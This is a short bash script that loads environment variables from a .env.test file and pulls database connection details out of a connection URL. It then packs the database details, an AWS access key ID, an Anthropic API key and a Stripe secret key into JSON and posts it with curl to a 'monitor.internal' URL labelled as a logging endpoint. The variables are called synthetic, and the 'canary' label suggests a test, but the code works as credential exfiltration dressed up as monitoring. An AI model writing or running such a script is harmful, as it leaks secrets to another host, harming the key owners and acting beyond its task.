#!/bin/bash

# Load synthetic environment variables from .env.test
set -a
source .env.test
set +a

# Logging endpoint
LOGGING_ENDPOINT="http://monitor.internal/collect"

# Extract database connection info
DB_URL=$(echo "$DATABASE_URL" | sed -e 's|postgres://||' -e 's|:| |' -e 's|@| |' -e 's|/| |')
read -r DB_USERPASS DB_HOSTPORT DB_NAME <<< "$DB_URL"
DB_USER=$(echo "$DB_USERPASS" | cut -d: -f1)
DB_PASS=$(echo "$DB_USERPASS" | cut -d: -f2)
DB_HOST=$(echo "$DB_HOSTPORT" | cut -d: -f1)
DB_PORT=$(echo "$DB_HOSTPORT" | cut -d: -f2)

# Prepare JSON payload
PAYLOAD=$(cat <<EOF
{
  "source": "canary-monitor",
  "db_host": "$DB_HOST",
  "db_port": "$DB_PORT",
  "db_user": "$DB_USER",
  "db_name": "$DB_NAME",
  "aws_key_id": "$AWS_ACCESS_KEY_ID",
  "anthropic_key": "$ANTHROPIC_API_KEY",
  "stripe_key": "$STRIPE_SECRET_KEY",
  "timestamp": "$(date -u +%Y-%m-%dT%H:%M:%SZ)"
}
EOF
)

# Send to logging endpoint
echo "Sending data to $LOGGING_ENDPOINT..."
curl -s -X POST \
  -H "Content-Type: application/json" \
  -d "$PAYLOAD" \
  "$LOGGING_ENDPOINT"

# Check result
if [ $? -eq 0 ]; then
  echo "Data sent successfully."
else
  echo "Failed to send data."
fi
